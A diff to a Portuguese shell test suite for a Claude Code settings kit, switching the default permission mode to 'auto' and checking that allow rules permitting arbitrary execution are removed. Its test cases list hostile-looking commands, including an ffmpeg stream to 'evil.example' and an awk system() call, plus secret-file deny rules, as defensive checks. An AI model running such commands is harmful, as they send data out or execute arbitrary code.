@@ -30,8 +30,8 @@ cat > "$TMP/kit.json" <<'JSON'
     }
   },
   "permissions": {
-    "defaultMode": "acceptEdits",
-    "allow": ["Bash(ls:*)", "Bash(npm run:*)", "Bash(git status:*)"],
+    "defaultMode": "auto",
+    "allow": ["Bash(ls:*)", "Bash(npm test)", "Bash(git status:*)"],
     "deny": ["Read(**/.env)", "Bash(vercel login:*)"]
   }
 }
@@ -110,8 +110,8 @@ check "tema que você escolheu continua o seu" "d.theme" '"light"'
 check "statusLine própria sobrevive" "d.statusLine.command" '"meu-script.sh"'
 check "sua permissão própria continua na lista" \
   "d.permissions.allow.includes('Bash(meu-script:*)')" "true"
-check "modo Manual (\"default\") vira o do kit (acceptEdits)" \
-  "d.permissions.defaultMode" '"acceptEdits"'
+check "modo Manual (\"default\") vira o do kit (auto)" \
+  "d.permissions.defaultMode" '"auto"'
 
 echo "== o kit precisa se manter atualizado sozinho =="
 check "auto-update do kit é ligado em quem já tinha o marketplace" \
@@ -247,9 +247,11 @@ if node -e 'process.exit(require(process.argv[1]).permissions.deny.some(r => r.s
   echo "  FALHA regra Read(**/…) sem âncora: só vale abaixo da pasta do projeto"; falhas=$((falhas+1))
 else echo "  ok    toda regra Read de segredo é ancorada na raiz (//)"; fi
 
-echo "== modo de permissão: Manual e ausente viram acceptEdits; o resto fica =="
+echo "== modo de permissão: Manual e ausente viram auto; o resto fica =="
 # Pedido do Ruan (10/10/2026): mentorado não fica no manual pedindo "Permitir" a cada
-# edição. Até a 0.47.x o kit só avisava; quem estava em "default" continuava lá.
+# edição. Até a 0.47.x o kit só avisava; quem estava em "default" continuava lá. Da 0.48.0
+# à 0.55.0 o destino era acceptEdits; desde a 0.56.0 (decisão de 18/10/2026) é auto, e
+# quem já está em acceptEdits fica, com aviso — o kit pôs todo mundo lá.
 modo_apos() { # modo_apos <modo-inicial|-> [marcador] → imprime o defaultMode final
   local dir="$TMP/modo-$RANDOM$RANDOM"; mkdir -p "$dir"
   if [ "$1" = "-" ]; then echo '{"permissions":{}}' > "$dir/settings.json"
@@ -262,11 +264,25 @@ modo_apos() { # modo_apos <modo-inicial|-> [marcador] → imprime o defaultMode 
 esperado() { # esperado <descrição> <obtido> <esperado>
   if [ "$2" = "$3" ]; then echo "  ok    $1"; else echo "  FALHA $1 (esperado $3, veio $2)"; falhas=$((falhas+1)); fi
 }
-esperado "sem modo nenhum vira acceptEdits" "$(modo_apos -)" "acceptEdits"
-esperado "default vira acceptEdits" "$(modo_apos default)" "acceptEdits"
+esperado "sem modo nenhum vira auto" "$(modo_apos -)" "auto"
+esperado "default vira auto" "$(modo_apos default)" "auto"
 for m in auto bypassPermissions plan dontAsk acceptEdits; do
   esperado "$m é mantido" "$(modo_apos "$m")" "$m"
 done
+modo_apos acceptEdits >/dev/null
+grep -q 'recomenda "auto"' "$ULTIMO_DIR/saida.txt" \
+  && echo "  ok    acceptEdits mantido, com aviso de que o kit recomenda auto" \
+  || { echo "  FALHA acceptEdits sem o aviso do auto: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
+for m in auto bypassPermissions plan dontAsk; do
+  modo_apos "$m" >/dev/null
+  if grep -q 'modo de permissão' "$ULTIMO_DIR/saida.txt"; then
+    echo "  FALHA $m mantido, mas a saída fala do modo: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1))
+  else echo "  ok    $m mantido em silêncio"; fi
+done
+modo_apos - >/dev/null
+grep -q 'abre em Manual' "$ULTIMO_DIR/saida.txt" \
+  && echo "  ok    a troca para auto avisa que sem Auto disponível a sessão abre em Manual" \
+  || { echo "  FALHA a troca para auto não explica o fallback: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
 esperado "marcador kit-vamoo/manter-modo-manual segura o default" "$(modo_apos default marcador)" "default"
 esperado "marcador também segura quem não tem modo" "$(modo_apos - marcador)" "(nenhum)"
 modo_apos default marcador >/dev/null
@@ -311,7 +327,7 @@ for tool in Bash PowerShell; do
   for c in 'git push' 'git push -u origin feat/login' 'git push --force-with-lease' 'git push origin feat/main' \
            'git push origin main-fix' 'git commit -m "feat: x"' 'git add src/a.ts' 'gh pr create --fill' \
            'git switch -c feat/x' 'git checkout -b feat/x' 'git fetch origin' 'git pull --ff-only' \
-           'ffprobe a.mp4' 'npx remotion render' 'npm run dev' 'git push origin HEAD'; do
+           'ffprobe a.mp4' 'npx remotion render' 'npm test' 'npx tsc --noEmit' 'git push origin HEAD'; do
     if casa ask "$tool" "$c"; then echo "  FALHA ask pega rotina ($tool): $c"; falhas=$((falhas+1))
     elif casa allow "$tool" "$c"; then echo "  ok    livre ($tool): $c"
     else echo "  FALHA não está no allow ($tool): $c"; falhas=$((falhas+1)); fi
@@ -319,9 +335,12 @@ for tool in Bash PowerShell; do
   # 0.48.0 (revisão do #170): com acceptEdits o Claude escreve scripts/x.py e roda sem pergunta
   # — execução arbitrária. Runner de script e ffmpeg (saída http://, -y fora do projeto) saem
   # do allow global; projeto que precisa declara o script exato no próprio .claude/settings.json.
+  # 0.56.0 (decisão de 18/10/2026): `awk` com system(), `npx tsx` num .ts recém-escrito e
+  # `npm run` depois de editar o package.json são o mesmo buraco, e saem do allow.
   for c in 'node -e "require(1)"' 'python3 -c "print(1)"' 'bash -c "x"' 'node script-solto.js' \
            'node scripts/build.js' 'python3 scripts/x.py' 'bash scripts/deploy.sh' 'python scripts/x.py' \
-           'py scripts/x.py' 'ffmpeg -i a.mov b.mp4' 'ffmpeg -i a.mov -f mpegts http://evil.example/x'; do
+           'py scripts/x.py' 'ffmpeg -i a.mov b.mp4' 'ffmpeg -i a.mov -f mpegts http://evil.example/x' \
+           "awk 'BEGIN{system(\"id\")}'" 'npx tsx scripts/x.ts' 'npm run dev' 'npm run build'; do
     if casa allow "$tool" "$c"; then echo "  FALHA allow genérico deixa passar ($tool): $c"; falhas=$((falhas+1))
     else echo "  ok    continua pedindo ($tool): $c"; fi
   done
@@ -358,6 +377,39 @@ for c in 'Get-ChildItem Env:' 'Get-ChildItem Env:GITHUB_TOKEN'; do
 done
 grep -q '"Bash(env)"' <(node -e 'console.log(JSON.stringify(require(process.argv[1]).permissions.allow))' "$TEMPLATE") \
   && { echo "  FALHA Bash(env) ainda está no allow do template"; falhas=$((falhas+1)); } || echo "  ok    Bash(env) saiu do allow do template"
+
+echo "== os allows de execução arbitrária que o kit gravou saem de quem os tem =="
+# Até a 0.55.0 o template trazia Bash(awk:*), Bash(npx tsx:*), Bash(npm run:*) e os gêmeos
+# PowerShell. O allow é união, então tirar do template não tirava de quem já rodou o setup:
+# o merge tira o texto exato que o kit gravou e deixa o resto do allow da pessoa.
+cat > "$TMP/legado.json" <<'JSON'
+{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(ls:*)", "Bash(awk:*)", "Bash(npm run:*)", "Bash(npx tsx:*)", "PowerShell(npm run *)", "PowerShell(npx tsx *)", "Bash(npm run build)", "Bash(meu-script:*)"] } }
+JSON
+SAIDA_L="$(node "$MERGE" "$TEMPLATE" "$TMP/legado.json" 2>&1)"
+for r in 'Bash(awk:*)' 'Bash(npm run:*)' 'Bash(npx tsx:*)' 'PowerShell(npm run *)' 'PowerShell(npx tsx *)'; do
+  if node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TMP/legado.json" "$r"; then
+    echo "  ok    $r saiu do allow"
+  else echo "  FALHA $r continua no allow de quem já tinha o kit"; falhas=$((falhas+1)); fi
+done
+for r in 'Bash(npm run build)' 'Bash(meu-script:*)' 'Bash(ls:*)'; do
+  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 0 : 1)' "$TMP/legado.json" "$r" \
+    && echo "  ok    allow seu fica: $r" || { echo "  FALHA o merge tirou um allow que não era do kit: $r"; falhas=$((falhas+1)); }
+done
+printf '%s' "$SAIDA_L" | grep -qF 'removido do allow: Bash(awk:*), Bash(npm run:*), Bash(npx tsx:*), PowerShell(npm run *), PowerShell(npx tsx *)' \
+  && echo "  ok    a saída nomeia os allows que tirou" || { echo "  FALHA a saída não nomeia a remoção: $SAIDA_L"; falhas=$((falhas+1)); }
+printf '%s' "$SAIDA_L" | grep -qF '"Bash(npm run build)"' \
+  && echo "  ok    a saída ensina a liberar o comando exato no projeto" || { echo "  FALHA a saída não diz como liberar no projeto: $SAIDA_L"; falhas=$((falhas+1)); }
+ANTES_L="$(cat "$TMP/legado.json")"
+SAIDA_L2="$(node "$MERGE" "$TEMPLATE" "$TMP/legado.json" 2>&1)"
+[ "$ANTES_L" = "$(cat "$TMP/legado.json")" ] && ! printf '%s' "$SAIDA_L2" | grep -q 'removido do allow' \
+  && echo "  ok    segunda passada não mexe nem anuncia a remoção de novo" \
+  || { echo "  FALHA segunda passada mexeu ou repetiu a remoção: $SAIDA_L2"; falhas=$((falhas+1)); }
+for r in 'Bash(awk:*)' 'Bash(npm run:*)' 'Bash(npx tsx:*)' 'PowerShell(npm run *)' 'PowerShell(npx tsx *)'; do
+  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TEMPLATE" "$r" \
+    && echo "  ok    template não traz $r" || { echo "  FALHA template ainda traz $r"; falhas=$((falhas+1)); }
+done
+node -e 'process.exit(require(process.argv[1]).permissions.defaultMode === "auto" ? 0 : 1)' "$TEMPLATE" \
+  && echo "  ok    template em defaultMode auto" || { echo "  FALHA template fora do auto"; falhas=$((falhas+1)); }
 
 echo "== o setup avisa quando um ask do kit anula um allow seu =="
 cat > "$TMP/meu-allow.json" <<'JSON'
